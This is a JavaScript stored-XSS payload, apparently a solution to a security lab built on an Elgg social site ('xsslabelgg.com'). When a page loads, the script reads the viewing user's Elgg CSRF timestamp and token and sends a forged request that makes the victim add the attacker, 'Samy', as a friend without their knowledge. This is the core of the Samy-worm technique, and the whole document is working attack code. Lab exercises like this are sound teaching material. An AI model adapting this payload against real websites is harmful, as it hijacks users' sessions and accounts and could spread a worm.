<script type="text/javascript">
	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;

		//Got from browser inspect element --> Network --> Params --> Form Data --> guid
		var samy_guid = 47;
		//current user guid got from printing elgg object
		var current_user_guid = elgg.session.user.guid;

		//Construct the HTTP request to add Samy as a friend.
		var addFriendRouteWithSamy = "http://www.xsslabelgg.com/action/friends/add?friend="+samy_guid;
		//var removeFriendRouteWithSamy = "http://www.xsslabelgg.com/action/friends/remove?friend="+samy_guid;

		//var RequestUrl = http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624433345&__elgg_token=atIyiXNxMyWuXnJgeqs3_A&__elgg_ts=1624433345&__elgg_token=atIyiXNxMyWuXnJgeqs3_A
		var sendurl = addFriendRouteWithSamy + ts + token + ts + token; //FILL IN
		//var sendurl = removeFriendRouteWithSammy + ts + token + ts + token; 

		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to add friend
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();	
		}
	}
</script>